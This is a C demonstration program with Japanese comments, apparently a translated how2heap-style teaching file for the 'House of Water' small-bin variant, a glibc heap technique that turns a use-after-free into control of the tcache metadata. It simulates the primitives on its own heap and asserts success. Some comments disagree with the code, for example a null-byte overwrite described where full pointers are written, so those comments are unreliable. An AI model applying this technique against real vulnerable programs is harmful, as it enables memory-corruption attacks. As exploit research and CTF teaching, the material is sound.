#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

/* 
 * House of Water は、Use-After-Free (UAF) 脆弱性を tcache の
 * メタデータ制御プリミティブ(primitive)に変換する技法です。
 *
 * 改良版 House of Water: この技法では、整数をインクリメントできなくても、4 ビットのブルートフォース(bruteforce)はもう不要です。
 * 偽のチャンクは small bin を通じてリンクされるため、tcache 構造体の内部で size フィールドを偽造する必要はありません。
 * この新しい派生版と、元の House of Water との違いを解説した記事は次にあります:
 * https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/House_Of_Water_Smallbin_Variant.md
 *
 * この技法は、まず tcache のメタデータの直後に 'relative chunk' を確保することから始めます。
 * これは、ターゲットとなる偽のチャンクの位置と、ASLR を部分的に制御できる同じ 2 番目のニブル(nibble、値は 2)を共有します。
 * 
 * 次に、'relative chunk' と同じサイズの、制御できる別の 2 つのチャンクを使って、0x310 と 0x320 の bin に偽の tcache エントリを作り、
 * 'relative chunk' を中央に保ったまま、3 つのチャンクすべてを unsorted bin に解放します。
 * 大きな確保を行うと、それらは同じ small bin の連結リストにソートされます。
 * 
 * UAF により、'first chunk' の fd と 'end chunk' の bk ポインタの LSB を 0x00 で上書きし、どちらも tcache 上の偽の tcache チャンクに向け直します。
 * 最後に tcache を使い切ります。次の確保で small bin から 'first chunk' が返され、残りのチャンクが tcache に移されます。
 * その次の確保で 'end chunk' が返され、最後の確保で `tcache_perthread_struct` を制御するための偽のチャンクが返されます。
 *
 * 技法 / house の作者: @udp_ctf - Water Paddler / Blue Water
 * small bin 版の改良: @4f3rg4n - CyberEGGs
 */



void dump_memory(void *addr, unsigned long count) {
	for (unsigned int i = 0; i < count*16; i += 16) {
		printf("0x%016lx\t\t0x%016lx  0x%016lx\n", (unsigned long)(addr+i), *(long *)(addr+i), *(long *)(addr+i+0x8));
	}	
}

int main(void) {
	// ダミー変数
	void *_ = NULL;

	// _IO_FILE がヒープ内でバッファリングしないようにします
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 0           |");
	puts("\t==============================");
	puts("\n");

	puts("glibc-2.42 では非常に重要です! 現在 `tcache_perthread_struct` の sizeof は 0x300 です\n");
	puts("次のヒープ風水(heap fengshui)がないと、この技法には 4 ビットのブルートフォースが必要になります\n\n");

	// このヒープ風水(heap fengshui)により、`tcache_perthread_struct` がオフセット 0x1f0 に確保されます。これは私たちに好都合です
	puts("free(malloc(0x1e0)) を行い、`tcache_perthread_struct` を強制的にずらします\n");
	free(malloc(0x1e0));


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 1           |");
	puts("\t==============================");
	puts("\n");

	// Step 1: 後で乗っ取りに使う、unsorted bin の連結リストを作ります

	puts("次に、間にガードチャンクを挟んで 0x90 のチャンクを 3 つ確保します。これにより");
	puts("チャンクの統合(consolidation)が防がれ、house of water 攻撃の標的が設定されます。");
	puts("\t- チャンク:");

	void *relative_chunk = malloc(0x88);
	printf("\t\t* relative_chunk\t@ %p\n", relative_chunk);
	_ = malloc(0x18); // ガードチャンク
	
	puts("\t\t* /ガード/");

	void *small_start = malloc(0x88);
	printf("\t\t* small_start\t@ %p\n", small_start);
	_ = malloc(0x18); // ガードチャンク
	
	puts("\t\t* /ガード/");

	void *small_end = malloc(0x88);
	printf("\t\t* small_end\t@ %p\n", small_end);
	_ = malloc(0x18); // ガードチャンク
	
	puts("\t\t* /ガード/");
	
	puts("");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 2           |");
	puts("\t==============================");
	puts("\n");

	// Step 2: 0x90 サイズクラスの t-cache を満たします
	
	// これは、後で使うために t-cache のメタデータへのポインタを作っているだけです。
	void *metadata = (void *)((long)(relative_chunk) & ~(0xfff)) + 0x190;
	printf("metadata: %p\n", metadata);

	// 0x90 の t-cache を使い切れるように、解放用の確保を行います
	puts("後で 0x90 の t-cache を満たすために必要な 0x88 のチャンクを 0x10 個確保します");
	void *x[0x10];
	for (int i = 0; i < 0x10; i++) {
		x[i] = malloc(0x88);
	}

	puts("");

	// t-cache のエントリを解放します
	puts("先ほど確保したチャンクを free して、0x90 の t-cache を満たします。");
	puts("こうすると、次に 0x88 のチャンクを free したとき、そのチャンクは t-cache や small-bin ではなく");
	puts("unsorted-bin に入ります。");
	for (int i = 0; i < 0x10; i++) {
		free(x[i]);
	}

	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 3           |");
	puts("\t==============================");
	puts("\n");

	// Step 3: small_start と small_end に重なる、0x310 と 0x320 の t-cache エントリを作ります。
	// こうすることで、t-cache のメタデータ内に FWD と BCK のポインタをブラインドで偽造できます!
		
	puts("ここからが最も難しい部分です!\n");
	
	puts("基本的に、0x310 の t-cache メタデータ内のポインタを FWD ポインタとして、\n");
	puts("0x320 の t-cache 内のポインタを BCK ポインタとして機能させたいのです。");
	puts("これらが、t-cache では一般的なチャンク自体ではなく、small bin のエントリの\n");
	puts("チャンクヘッダを指すようにしたいのです。\n");

	puts("house of botcake のような技法や、より強力な任意の free のプリミティブを使って、");
	puts("unsorted_start と unsorted_end のヘッダに重なるようにチャンクを free します。");
	puts("");

	puts("次のようになるはずです:");
	puts("");
	
	puts("small_start:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x320][0/1], unsortedbin[all][0]\n", (unsigned long)(small_start-0x10), *(long *)(small_start-0x10), *(long *)(small_start-0x8));
	dump_memory(small_start, 2);
	puts("");

	puts("small_end:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x310][0/1], unsortedbin[all][2]\n", (unsigned long)(small_end-0x10), *(long *)(small_end-0x10), *(long *)(small_end-0x8));
	dump_memory(small_end, 2);

	puts("\n");
	puts("double free だけを使ったブラインドな例を見たい場合は、次の chal を見てください: ");
	puts("https://github.com/UDPctf/CTF-challenges/tree/main/Potluck-CTF-2023/Tamagoyaki");
	puts("");
	puts("注意: 同じ例を改良版の House of Water で見たい場合は、こちらを見てください: ");
	puts("https://github.com/4f3rg4n/CTF-Events-Writeups/blob/main/Potluck-CTF-2023/Tamagoyaki.md");
	puts("\n");

	puts("簡単にするため、任意の free のプリミティブを模擬するだけにします。");
	puts("\n");
	
	
	puts("--------------------");
	puts("|      PART 1      |");
	puts("--------------------");
	puts("\n");

	// Step 3 part 1:
	puts("small_start の上に 0x321 を書き込み、0x320 の t-cache に free できるようにします。");
	printf("\t*%p-0x18 = 0x321\n", small_start);
	*(long*)(small_start-0x18) = 0x321;
	puts("");

	puts("これにより、small_start のすぐ上に 0x321 のエントリができ、次のようになります:");
	dump_memory(small_start-0x20, 3);
	puts("");

	printf("偽の 0x321 のチャンクを free します @ %p\n", small_start-0x10);
	free(small_start-0x10); // 偽の FWD を作ります
	puts("");
	
	puts("最後に、0x331 のチャンクを free したことで作られたメタデータのため、");
	puts("0x91 のヘッダを書き戻して、small_start チャンクの元のヘッダを復元する必要があります:");
	printf("\t*%p-0x8 = 0x91\n", small_start);
	*(long*)(small_start-0x8) = 0x91;
	puts("");

	puts("次に、small_end にも同じことを行いますが、0x311 の偽のチャンクを使います。");
	puts("");


	puts("--------------------");
	puts("|      PART 2      |");
	puts("--------------------");
	puts("\n");

	// Step 3 part 2:
	puts("small_end の上に 0x311 を書き込み、0x320 の t-cache に free できるようにします:");
	printf("\t*%p-0x18 = 0x311\n", small_end);
	*(long*)(small_end-0x18) = 0x311;
	puts("");
	
	puts("これにより、small_end のすぐ上に 0x311 ができ、次のようになります:");
	dump_memory(small_end-0x20, 3);
	puts("");
	
	printf("偽の 0x311 のチャンクを free します @ %p\n", small_end-0x10);
	free(small_end-0x10); // 偽の BCK を作ります
	puts("");
	
	puts("0x91 のヘッダを書き戻して、small_end チャンクの元のヘッダを復元します:");
	printf("\t*%p-0x8 = 0x91\n", small_end);
	*(long*)(small_end-0x8) = 0x91;
	puts("");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 4           |");
	puts("\t==============================");
	puts("\n");

	// Step 4: small_start、relative_chunk、small_end を unsorted bin に解放して small bin のリストを作り、
	// その後、unsorted bin を small bin にソートさせる大きなチャンクを確保します。

	puts("それでは、チャンクを unsorted bin に解放しましょう。");
	
	puts("\t> free(small_end);");
	free(small_end);
	
	puts("\t> free(relative_chunk);");
	free(relative_chunk);
	
	puts("\t> free(small_start);");
	free(small_start);
	
	puts("\n");

	puts("次に、大きなチャンクを確保して、unsorted bin のエントリを small bin にソートさせます。");
	_ = malloc(0x700);

	puts("");

	// 設定をそのまま表示します
	
	puts("この時点で、ヒープは次のようになっています:");
	
	printf("\t- Small bin:\n");
	puts("\t\tsmall_start <--> relative_chunk <--> small_end");
	printf("\t\t%p <--> %p <--> %p\n", small_start-0x10, relative_chunk-0x10, small_end-0x10);
	
	printf("\t- 0x310 t-cache:\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x310));
	printf("\t- 0x320 t-cache\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x318));
	puts("");

	puts("t-cache 内の偽のチャンクは次のようになります:");
	dump_memory(metadata+0x370, 4);
	puts("");

	puts("0x320 の t-cache が small_start を、0x310 の t-cache が ");
	puts("small_end を指していることが確認できます。これは、small-bin のエントリを偽造して relative_chunk を乗っ取るために必要なものです。");


	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 5           |");
	puts("\t==============================");
	puts("\n");

	// Step 5: small_start と small_end の LSB を上書きして、偽の t-cache メタデータのチャンクを指すようにします
	puts("最後に残るのは、small_start の FWD ポインタと、");
	puts("small_end の BCK ポインタの LSB を上書きして、偽の t-cache メタデータのチャンクを指すようにすることだけです。");
	puts("");

	// 注意: small_start と small_end の LSB は、0x90 の代わりに単一のヌルバイトで上書きするだけです。
	// その結果、それらは tcache 内の偽のチャンクを指します。この偽のチャンクは relative_chunk と ASLR の 2 バイト目のニブル (0x2) を共有しています。

	/* VULNERABILITY */
	printf("\t- small_start:\n");
	void *metadata_page = (void*)((long)metadata & ~0xfff);
	printf("\t\t*%p = %p\n", small_start, metadata_page+0x400);
	*(unsigned long *)small_start = (unsigned long)(metadata_page+0x400);
	puts("");

	printf("\t- small_end:\n");
	printf("\t\t*%p = %p\n", small_end, metadata_page+0x400);
	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata_page+0x400);
	puts("");
	/* VULNERABILITY */

	puts("この時点で、small bin は次のようになります:");
	puts("");

	puts("\t- small bin:");
	printf("\t\t small_start <--> メタデータのチャンク <--> small_end\n");
	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x400, small_end);

	puts("\n");
	puts("\t==============================");
	puts("\t|           STEP 6           |");
	puts("\t==============================");
	puts("\n");

	// Step 6: 確保して勝利します
	puts("あとは、small bin の中に置かれた偽のチャンクを確保するだけです");
	puts("ただしその前に、malloc に small bin から確保させるため、");
	puts("0x90 サイズクラスの t-cache を空にする必要があります。");

	for(int i = 0x10; i > 0; i--)
		_ = malloc(0x88);

	// small_start と small_end を再度確保して、0x90 の t-cache bin から取り除きます
	_ = malloc(0x88);
	_ = malloc(0x88);


	// 次の確保は、偽のチャンクになる*かもしれません*!
	void *meta_chunk = malloc(0x88);

	printf("\t\t新しいチャンク\t @ %p\n", meta_chunk);
	printf("\t\tt-cache のメタデータ @ %p\n", metadata);
	assert(meta_chunk == (metadata+0x280));

	puts("");
}
